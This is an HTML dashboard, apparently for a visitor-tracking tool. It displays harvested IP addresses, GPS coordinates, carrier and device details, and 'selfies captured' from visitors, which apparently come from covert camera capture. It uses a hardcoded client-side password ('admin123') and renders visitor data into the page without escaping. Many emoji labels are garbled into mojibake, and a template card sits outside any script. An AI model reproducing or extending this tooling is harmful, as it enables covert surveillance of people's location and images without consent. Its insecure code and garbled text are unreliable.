<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Visitor Data Viewer</title>
    <style>
        /* ... (keep previous styles) ... */
        .import-export { background: #e7f3ff; padding: 15px; margin: 10px 0; border-radius: 5px; }
        .data-actions { display: flex; gap: 10px; margin: 10px 0; }
        .action-btn { padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer; }
        .action-btn.export { background: #17a2b8; }
        .action-btn.import { background: #6c757d; }
        .action-btn.clear { background: #dc3545; }
        .hidden { display: none; }
        input[type="file"] { margin: 10px 0; }
    </style>
</head>
<body>
 <!-- In the online visitors section, update the card display -->
<div class="visitor-card">
    <h3>üë§ ${new Date(data.timestamp).toLocaleString()}</h3>
    <p><strong>üåê IP:</strong> ${data.ip}</p>
    <p><strong>üì∂ Network:</strong> ${data.network_info?.connectionType?.type || 'Unknown'}</p>
    <p><strong>üè¢ Carrier:</strong> ${data.network_info?.simOperator?.carrier || 'Unknown'}</p>
    <p><strong>üìç Location:</strong> ${data.network_info?.simOperator?.country || 'Unknown'}</p>
    <p><strong>üì° ISP:</strong> ${data.network_info?.networkInfo?.isp || 'Unknown'}</p>
    <p><strong>üíª Platform:</strong> ${data.device_info.platform}</p>
    <p><strong>üì± Screen:</strong> ${data.device_info.screenWidth}x${data.device_info.screenHeight}</p>
    
    ${data.hasSelfies ? `
        <strong>üì∏ Selfies (${data.selfies ? data.selfies.length : 0}):</strong>
        <div class="selfie-container">
            ${data.selfies.map((selfie, index) => 
                `<img src="${selfie}" alt="Selfie ${index + 1}" onclick="viewFullImage('${selfie}')">`
            ).join('')}
        </div>
    ` : '<p>üì∑ No selfies captured</p>'}
    
    <div class="device-info">
        <strong>Full Network Info:</strong>
        <pre>${JSON.stringify(data.network_info, null, 2)}</pre>
    </div>
</div>
    <script>
        const PASSWORD = "admin123";

        function checkPassword() {
            const password = document.getElementById('password').value;
            if (password === PASSWORD) {
                document.getElementById('content').classList.remove('hidden');
                document.querySelector('.password-section').classList.add('hidden');
                loadData();
            } else {
                alert('Incorrect password!');
            }
        }

        function loadData() {
            const visitors = GitHubFriendlyStorage.getAllLocalData();
            const container = document.getElementById('visitors-container');
            const stats = document.getElementById('stats');
            
            stats.innerHTML = `È¶ÉÊê± Total visitors: ${visitors.length} | È¶ÉÊçë Storage: ${(JSON.stringify(visitors).length / 1024).toFixed(2)} KB`;
            container.innerHTML = '';
            
            if (visitors.length === 0) {
                container.innerHTML = '<div class="visitor-card"><p>No visitor data found.</p></div>';
                return;
            }
            
            visitors.forEach(visitor => {
                const data = visitor.data;
                const card = document.createElement('div');
                card.className = 'visitor-card';
                
                card.innerHTML = `
                    <h3>È¶ÉÊáÅ Visitor: ${new Date(data.timestamp).toLocaleString()}</h3>
                    <p><strong>È¶ÉÂØ™ IP:</strong> ${data.ip}</p>
                    <p><strong>È¶ÉÊê∑ Coordinates:</strong> ${data.latitude}, ${data.longitude}</p>
                    
                    ${data.ipinfo ? `
                        <p><strong>È¶ÉÂΩî Location:</strong> ${data.ipinfo.city || 'N/A'}, ${data.ipinfo.region || 'N/A'}, ${data.ipinfo.country || 'N/A'}</p>
                        <p><strong>È¶ÉÂΩö Organization:</strong> ${data.ipinfo.org || 'N/A'}</p>
                    ` : ''}
                    
                    <div class="device-info">
                        <strong>È¶ÉÊçá Device Information:</strong>
                        ${Object.entries(data.device_info || {}).map(([key, value]) => 
                            `<div><strong>${key}:</strong> ${value}</div>`
                        ).join('')}
                    </div>
                    
                    ${data.selfies && data.selfies.length > 0 ? `
                        <strong>È¶ÉÊë≥ Selfies (${data.selfies.length}):</strong>
                        <div class="selfie-container">
                            ${data.selfies.map(selfie => 
                                `<img src="${selfie}" alt="Selfie" onclick="viewFullImage('${selfie}')">`
                            ).join('')}
                        </div>
                    ` : '<p>È¶ÉÊë≤ No selfies captured</p>'}
                `;
                
                container.appendChild(card);
            });
        }

        function exportData() {
            GitHubFriendlyStorage.exportData();
            showStatus('Data exported successfully!', 'success');
        }

        async function importData(file) {
            if (!file) return;
            
            const statusElement = document.getElementById('data-status');
            statusElement.innerHTML = 'Importing data...';
            
            const result = await GitHubFriendlyStorage.importData(file);
            
            if (result.success) {
                statusElement.innerHTML = `ÈâÅÔøΩ Successfully imported ${result.count} visitors`;
                loadData(); // Refresh the view
            } else {
                statusElement.innerHTML = `ÈâÇÔøΩ Import failed: ${result.error}`;
            }
        }

        function clearData() {
            if (confirm('Are you sure you want to clear ALL visitor data? This cannot be undone.')) {
                const visitors = GitHubFriendlyStorage.getAllLocalData();
                visitors.forEach(visitor => {
                    localStorage.removeItem(visitor.key);
                });
                showStatus('All data cleared!', 'success');
                loadData();
            }
        }

        function viewFullImage(src) {
            window.open(src, '_blank');
        }

        function showStatus(message, type) {
            const statusElement = document.getElementById('data-status');
            statusElement.innerHTML = message;
            statusElement.style.color = type === 'success' ? 'green' : 'red';
        }

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') checkPassword();
        });
    </script>
    
    <script src="scripts/storage.js"></script>
    <script src="scripts/main.js"></script>
</body>
</html>
